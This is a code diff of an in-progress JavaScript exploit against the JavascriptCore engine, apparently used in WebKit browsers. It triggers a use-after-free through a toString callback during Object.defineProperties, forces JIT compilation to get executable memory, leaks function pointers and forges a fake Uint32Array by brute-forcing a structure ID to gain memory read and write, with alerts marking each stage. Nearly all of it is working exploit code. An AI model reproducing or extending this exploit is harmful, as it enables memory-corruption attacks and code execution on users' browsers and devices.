@@ -11,11 +11,9 @@ var fcp = 0;
 var smsh = new Uint32Array(0x10)
 
 // Trying to stop GC
-var stale = 0;
 function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
-
 
 
 var mem0 = 0;
@@ -114,7 +112,6 @@ function smashed(stl) {
 
 
 
-
 function go_() {
 	if(smsh.length != 0x10) {
 		smashed();
@@ -122,9 +119,9 @@ function go_() {
 	}
 	dgc();
 	var arr = new Array(0x100);
-	var yolo = new ArrayBuffer(0x1000);
-	arr[0] = yolo;
-	arr[1] = 0x13371337;
+	//var yolo = new ArrayBuffer(0x1000);
+	//arr[0] = yolo;
+	//arr[1] = 0x13371337;
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
@@ -150,29 +147,18 @@ function go_() {
 	var target = [];
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
-	stale = target.stale;
-	
+	var stale = target.stale;
 
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
-		
-		// Keeps arr referenced so that the func doesn't crash upon return.
-		// Still crashes on GC.
 		keep(arr);
 	} else {
 		//alert("Exploit Failed");
 		document.location.reload();
-		return;
 	}
-	
-	//stale[0] += 0x101;
-	//alert("before gc");
-	//dgc();
-	//alert("after gc");
-	
-	
-	alert("before ret");
 	return;
+	
+	stale[0] += 0x101;
 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
 	// This will force JS to create a r/w/x block of memory, with raw machine code,
@@ -185,26 +171,28 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//var original_val = bufs[i][k];
-				//var original_val1 = bufs[i][k+1];
-				//alert("Pushed stale");
-				//bufs.push(stale);
+				//alert("Found the object!!");
+
+				// Leak function pointer
 				//stale[0] = fc;
 				//fcp = bufs[i][k];
-				dgc();
-				dgc();
-				dgc();
-				dgc();
-				alert("GC in loop");
-				return;
+				//alert("Leaked function pointer:" + fcp)
+
+
 				
+				//var original_val = bufs[i][k];
+				//var original_val1 = bufs[i][k+1];
+				alert("Pushed stale");
+				bufs.push(stale);
+				stale[0] = fc;
+				fcp = bufs[i][k];
+				structID = 100;
 				stale[0] = {
-					'a': u2d(105, 0x1172600), // the JSObject properties
+					'a': u2d(structID, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
 				}
-			
 				/*
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
@@ -227,12 +215,16 @@ function go_() {
  					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
 				*/
-				
+
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-				alert("Stage 2")
-			
-				return;
+
+				while(!(stale[0] instanceof Uint32Array)) {
+					structID++;
+					stale[1]['a'] = u2d(structID, 0);
+				}
+				alert('found structID for Uint32Array = ' + structID);
+				alert('stale[0] is now: ' + stale[0]);
 
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
